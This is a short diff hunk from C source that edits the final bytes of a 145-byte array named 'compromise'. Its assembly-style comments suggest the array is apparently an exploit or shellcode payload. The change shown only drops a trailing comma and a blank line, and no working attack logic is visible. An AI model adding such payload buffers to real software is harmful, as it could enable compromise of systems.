@@ -47,8 +47,7 @@ char compromise[145] = {
 0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
 0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
 0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
-0x61,0x00,0x00,0x00,                                // newAddr:    dd newAddr-start                               
-
+0x61,0x00,0x00,0x00                                 // newAddr:    dd newAddr-start                               
 };
 
 
